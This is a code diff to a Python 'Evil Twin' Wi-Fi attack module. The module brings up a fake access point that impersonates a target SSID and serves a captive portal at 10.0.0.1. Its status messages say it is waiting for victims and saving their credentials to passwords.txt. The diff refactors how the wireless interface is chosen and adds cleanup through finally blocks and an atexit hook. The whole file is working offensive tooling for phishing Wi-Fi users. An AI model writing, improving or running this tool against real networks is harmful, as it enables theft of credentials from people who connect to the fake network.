@@ -14,9 +14,10 @@ from pathlib import Path
 http_server = None
 server_thread = None
 running = False
-ap_interface = None
 target_ssid = None
+cleanup_done = False  # Prevent double cleanup
 
+# HTTP Handler Class (kept as class since BaseHTTPRequestHandler requires it)
 class CaptivePortalHandler(BaseHTTPRequestHandler):
     """HTTP handler for captive portal"""
     
@@ -192,6 +193,8 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(response.encode())
 
+# Functions (not in a class)
+
 def check_requirements():
     """Check if required files and tools exist"""
     # Check for bash scripts
@@ -217,29 +220,6 @@ def check_requirements():
     
     return True
 
-def find_available_interface(exclude=None):
-    """Find an available wireless interface for AP mode"""
-    try:
-        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
-        interfaces = []
-        
-        for line in result.stdout.split('\n'):
-            if 'Interface' in line:
-                iface = line.split('Interface')[1].strip()
-                # Skip monitor mode and excluded interface
-                if 'mon' not in iface and iface != exclude:
-                    interfaces.append(iface)
-        
-        # Prefer wlan0
-        if 'wlan0' in interfaces:
-            return 'wlan0'
-        
-        # Return first available
-        return interfaces[0] if interfaces else None
-        
-    except:
-        return None
-
 def start_web_server():
     """Start the captive portal web server"""
     global http_server, server_thread, running
@@ -261,7 +241,8 @@ def start_web_server():
             else:
                 print(f"[ERROR] Web server error: {e}")
         except Exception as e:
-            print(f"[ERROR] Web server error: {e}")
+            if running:  # Only show error if we're still supposed to be running
+                print(f"[ERROR] Web server error: {e}")
     
     print("[*] Starting captive portal web server...")
     running = True
@@ -284,35 +265,15 @@ def stop_web_server():
     subprocess.run(['sudo', 'fuser', '-k', '80/tcp'], 
                   stderr=subprocess.DEVNULL)
 
-def setup_evil_twin(monitor_iface, ssid, channel):
-    """Setup Evil Twin with fake AP and captive portal"""
-    global ap_interface, target_ssid
+def run_setup_script(ssid, channel):
+    """Run the bash setup script for AP"""
+    # Always use wlan0 for AP
+    ap_interface = "wlan0"
     
-    target_ssid = ssid
-    
-    print(f"\n{'='*60}")
-    print(f"    EVIL TWIN ATTACK - {ssid}")
-    print(f"{'='*60}\n")
-    
-    # Check requirements
-    if not check_requirements():
-        return False
-    
-    # Find available interface
-    ap_interface = find_available_interface(exclude=monitor_iface)
-    
-    if not ap_interface:
-        print("[ERROR] No available wireless interface for AP mode!")
-        print("[!] You need a second wireless adapter")
-        return False
-    
-    print(f"[*] Using {ap_interface} for fake AP")
-    print(f"[*] Monitor interface: {monitor_iface}")
-    
-    # Run setup script
-    print("\n[*] Setting up fake access point...")
+    print(f"[*] Setting up fake AP on {ap_interface}...")
     setup_script = "captive_portal/setup_ap.sh"
     
+    # Run setup script
     result = subprocess.run(
         ['sudo', 'bash', setup_script, ap_interface, ssid, str(channel)],
         capture_output=False  # Show script output
@@ -331,33 +292,34 @@ def setup_evil_twin(monitor_iface, ssid, channel):
             print("  - hostapd is not running")
         if dnsmasq_check.returncode != 0:
             print("  - dnsmasq is not running")
-        teardown_evil_twin()
         return False
-    
-    # Start web server for captive portal
-    start_web_server()
-    
-    print(f"\n{'='*60}")
-    print(f"[✓] Evil Twin '{ssid}' is active!")
-    print(f"[✓] Captive portal ready on 10.0.0.1")
-    print(f"[*] Waiting for victims to connect...")
-    print(f"[*] Credentials will be saved to: passwords.txt")
-    print(f"{'='*60}\n")
     
     return True
 
 def teardown_evil_twin():
-    """Stop Evil Twin and restore system"""
-    print("\n[*] Stopping Evil Twin attack...")
+    """Stop Evil Twin and restore system - can be called multiple times safely"""
+    global cleanup_done, running
+    
+    # Prevent double cleanup
+    if cleanup_done:
+        return
+    
+    cleanup_done = True
+    running = False
+    
+    print("\n[*] Cleaning up and restoring system...")
     
     # Stop web server
-    stop_web_server()
+    try:
+        stop_web_server()
+    except:
+        pass
     
     # Run teardown script
     teardown_script = "captive_portal/teardown_ap.sh"
     
     if os.path.exists(teardown_script):
-        print("[*] Restoring system to normal...")
+        print("[*] Running system restore script...")
         subprocess.run(['sudo', 'bash', teardown_script])
     else:
         print("[WARNING] Teardown script not found, doing basic cleanup...")
@@ -365,17 +327,91 @@ def teardown_evil_twin():
         subprocess.run(['sudo', 'killall', 'dnsmasq'], stderr=subprocess.DEVNULL)
         subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'])
     
-    print("[✓] Evil Twin stopped and system restored")
+    print("[✓] System restored to normal")
+
+def setup_evil_twin(monitor_iface, ssid, channel):
+    """Setup Evil Twin with fake AP and captive portal - with guaranteed cleanup"""
+    global target_ssid, cleanup_done
+    
+    # Reset cleanup flag for new attack
+    cleanup_done = False
+    target_ssid = ssid
+    
+    try:
+        print(f"\n{'='*60}")
+        print(f"    EVIL TWIN ATTACK - {ssid}")
+        print(f"{'='*60}\n")
+        
+        # Check requirements
+        if not check_requirements():
+            return False
+        
+        # Note about interface usage
+        print(f"[*] Using wlan0 (built-in NIC) for fake AP")
+        print(f"[*] Monitor interface: {monitor_iface}")
+        
+        if monitor_iface == "wlan0" or monitor_iface == "wlan0mon":
+            print("\n[WARNING] Monitor mode is on wlan0!")
+            print("[!] This may cause conflicts. Ensure you're using a different adapter for monitoring.")
+            print("[!] Continuing anyway...\n")
+        
+        # Run setup script (always uses wlan0)
+        if not run_setup_script(ssid, channel):
+            print("[ERROR] Failed to setup access point")
+            return False
+        
+        # Start web server for captive portal
+        start_web_server()
+        
+        print(f"\n{'='*60}")
+        print(f"[✓] Evil Twin '{ssid}' is active on wlan0!")
+        print(f"[✓] Captive portal ready on 10.0.0.1")
+        print(f"[*] Waiting for victims to connect...")
+        print(f"[*] Credentials will be saved to: passwords.txt")
+        print(f"{'='*60}\n")
+        
+        return True
+        
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted by user")
+        return False
+        
+    except Exception as e:
+        print(f"\n[ERROR] Unexpected error: {e}")
+        return False
+        
+    finally:
+        # This ALWAYS runs, even if there's an error or Ctrl+C
+        if not cleanup_done and running:
+            teardown_evil_twin()
+
+def stop_evil_twin():
+    """Wrapper function to stop Evil Twin"""
+    teardown_evil_twin()
 
 def is_running():
     """Check if Evil Twin is running"""
     return running
 
-# Wrapper functions for main script integration
 def quick_start(monitor_iface, bssid, ssid, channel):
     """Quick start function for main script integration"""
-    return setup_evil_twin(monitor_iface, ssid, channel)
+    # Note: bssid parameter not used but kept for compatibility
+    success = False
+    try:
+        success = setup_evil_twin(monitor_iface, ssid, channel)
+        return success
+    finally:
+        # If setup failed, cleanup is already done in setup_evil_twin's finally block
+        # This is just for safety
+        if not success and not cleanup_done:
+            teardown_evil_twin()
 
-def stop_evil_twin():
-    """Wrapper for teardown"""
-    teardown_evil_twin()
+def ensure_cleanup():
+    """Ensure cleanup happens when module is unloaded or script exits"""
+    global running
+    if running:
+        teardown_evil_twin()
+
+# Register cleanup when module is imported
+import atexit
+atexit.register(ensure_cleanup)
